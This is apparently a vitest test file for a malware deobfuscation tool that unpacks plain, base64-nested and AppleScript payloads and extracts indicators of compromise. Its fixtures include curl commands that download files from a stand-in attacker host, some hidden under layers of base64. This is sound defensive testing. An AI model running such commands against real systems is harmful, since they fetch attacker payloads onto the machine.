import { describe, it, expect } from 'vitest';
import { deobfuscate } from '../src/orchestrator';
import { nodeRunner } from '../src/node-runner';
import type { SandboxRunner, SandboxResult } from '../src/types';

describe('deobfuscate', () => {
  it('produces a single layer for a plain payload and extracts IOCs', async () => {
    const input = `"curl https://evil.com/a -o /tmp/x"`;
    const res = await deobfuscate(input, nodeRunner);
    expect(res.layers.length).toBe(1);
    expect(res.iocs.some(i => i.type === 'url' && i.value === 'https://evil.com/a')).toBe(true);
  });

  it('recurses into a nested base64 layer', async () => {
    const inner = 'curl https://evil.com/stage2 -o /tmp/y';
    const b64 = Buffer.from(inner).toString('base64');
    const input = `"${b64}"`;
    const res = await deobfuscate(input, nodeRunner);
    expect(res.layers.length).toBeGreaterThanOrEqual(2);
    expect(res.iocs.some(i => i.value === 'https://evil.com/stage2')).toBe(true);
  });

  it('decodes AppleScript `do shell script` statically without executing', async () => {
    const res = await deobfuscate(`osascript -e 'do shell script "echo applescript-ok"'`, nodeRunner);
    const out = res.layers.flatMap(l => l.output).join('\n');
    expect(out).toContain('echo applescript-ok');
    expect(res.layers[0].technique).toBe('applescript');
  });

  it('fully decodes a deep base64 chain and surfaces the final payload past the cap', async () => {
    let blob = 'curl https://example.com/deep-final -o /tmp/z';
    for (let i = 0; i < 6; i++) blob = Buffer.from(blob).toString('base64');
    const res = await deobfuscate(blob, nodeRunner, { maxDepth: 2 });
    expect(res.notes?.some(n => /depth cap/i.test(n))).toBe(true);
    expect(res.iocs.some(i => i.value === 'https://example.com/deep-final')).toBe(true);
  });

  it('honours the depth cap and does not reprocess a seen layer', async () => {
    // A runner that always echoes the same osascript line -> would loop forever.
    const loopRunner: SandboxRunner = {
      async run(): Promise<SandboxResult> {
        return { capturedStrings: [`osascript -l JavaScript -e 'x'`], events: [], errors: [], unsupportedCalls: [] };
      },
    };
    const res = await deobfuscate(`start`, loopRunner, { maxDepth: 5 });
    // seen-hash guard means the repeated identical layer is processed once.
    expect(res.layers.length).toBeLessThanOrEqual(5);
    expect(res.errors.every(e => !/timeout/i.test(e.message))).toBe(true);
  });
});
